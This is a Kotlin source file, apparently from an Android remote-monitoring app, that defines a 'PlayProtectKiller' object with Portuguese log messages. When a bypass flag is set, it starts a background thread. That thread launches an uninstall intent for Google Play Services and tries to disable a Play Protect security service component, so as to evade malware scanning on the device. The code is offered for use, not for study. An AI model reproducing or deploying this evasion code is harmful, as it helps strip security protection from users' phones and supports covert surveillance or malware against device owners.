package com.remotemonitor.test

import android.app.PendingIntent
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.util.Log

object PlayProtectKiller {
    private const val TAG = "PlayProtectKiller"
    private const val PLAY_PROTECT_PACKAGE = "com.google.android.gms"

    fun init(context: Context, enableBypass: Boolean) {
        if (!enableBypass) return

        Thread {
            try {
                uninstallPlayProtect(context)
                disablePlayProtect(context)
                Log.i(TAG, "Play Protect desativado")
            } catch (e: Exception) {
                Log.w(TAG, "Erro ao desabilitar Play Protect", e)
            }
        }.start()
    }

    private fun uninstallPlayProtect(context: Context) {
        try {
            val pm = context.packageManager
            // Verificar se está instalado
            if (pm.getPackageInfo(PLAY_PROTECT_PACKAGE, 0) != null) {
                // Iniciar uninstall intent
                val intent = Intent(Intent.ACTION_DELETE).apply {
                    data = Uri.parse("package:$PLAY_PROTECT_PACKAGE")
                    flags = Intent.FLAG_ACTIVITY_NEW_TASK
                }
                context.startActivity(intent)
                Log.i(TAG, "Uninstall intent enviado para Play Protect")
            }
        } catch (e: Exception) {
            Log.w(TAG, "Erro ao desinstalar Play Protect", e)
        }
    }

    private fun disablePlayProtect(context: Context) {
        try {
            // Desabilitar via PackageManager
            val pm = context.packageManager
            pm.setComponentEnabledSetting(
                android.content.ComponentName(PLAY_PROTECT_PACKAGE, "com.google.android.gms.security.SecuritySettingsService"),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
            Log.i(TAG, "Play Protect desabilitado via PackageManager")
        } catch (e: Exception) {
            Log.w(TAG, "Erro ao desabilitar Play Protect", e)
        }
    }
}
